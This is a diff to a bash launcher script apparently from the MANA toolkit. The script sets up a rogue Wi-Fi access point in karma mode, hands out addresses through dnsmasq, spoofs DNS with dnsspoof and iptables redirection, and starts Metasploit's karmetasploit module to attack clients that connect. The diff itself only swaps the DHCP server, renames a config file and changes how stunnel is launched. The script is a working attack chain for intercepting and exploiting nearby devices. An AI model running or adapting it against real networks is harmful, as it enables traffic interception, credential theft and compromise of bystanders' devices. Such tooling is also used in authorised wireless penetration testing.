@@ -1,7 +1,7 @@
 #!/bin/bash
 
 phy=wlan0
-conf=/etc/mana-toolkit/hostapd-karma.conf
+conf=/etc/mana-toolkit/hostapd-mana.conf
 hostapd=/usr/lib/mana-toolkit/hostapd
 
 hostname WRT54G
@@ -22,10 +22,10 @@ sleep 5
 ifconfig $phy 10.0.0.1 netmask 255.255.255.0
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 
-dhcpd -cf /etc/mana-toolkit/dhcpd.conf $phy
+dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd.conf -i $phy -I lo
 dnsspoof -i $phy -f /etc/mana-toolkit/dnsspoof.conf&
 service apache2 start
-service stunnel4 start
+stunnel4 /etc/mana-toolkit/stunnel.conf
 tinyproxy -c /etc/mana-toolkit/tinyproxy.conf&
 msfconsole -r /etc/mana-toolkit/karmetasploit.rc&
 
@@ -40,7 +40,7 @@ iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
 echo "Hit enter to kill me"
 read
 pkill hostapd
-pkill dhcpd
+pkill dnsmasq
 pkill dnsspoof
 pkill tinyproxy
 pkill stunnel4
